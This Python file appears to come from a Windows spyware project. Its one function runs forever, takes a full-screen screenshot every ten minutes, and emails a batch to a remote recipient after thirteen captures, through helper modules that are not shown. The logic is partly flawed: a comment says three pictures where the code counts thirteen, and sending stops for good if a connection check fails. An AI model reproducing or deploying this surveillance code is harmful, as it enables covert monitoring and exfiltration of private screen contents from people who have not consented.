#!/usr/bin/env python

# All of the program settings are definced in Settings.py
from Settings import *
from paths import *
from send_emails import *
from check_connection import *
from ctypes import windll



def capture_screenshots(file_path): 

    """This function takes snap shots of
        the host machine and send them by email.
        Every 13 captures image, an email is sent"""

    
    # using DPI aware to capture a full screenshot
    user32 = windll.user32
    user32.SetProcessDPIAware()

    if not os.path.exists(file_path):
        os.mkdir(file_path)

    counter = 0 # counter to create multiple screen shots

    while True:

        time.sleep(60 * 10) #evey 10 minutes
        image = ImageGrab.grab() # grab the image
        save_as = os.path.join(file_path,'ScreenShot_' +time.strftime('%Y_%m_%d') + str(counter) + '.jpg') 
        image.save(save_as)
        counter += 1

        if counter == 13:
            
            conn = get_current_connection()
            
            if conn == True :  
                #print "there is 3 pics in the folder"
                send_new_email(file_path)
                #delete_images(file_path)
                counter = 0
                
            else:
                continue
                
            
        


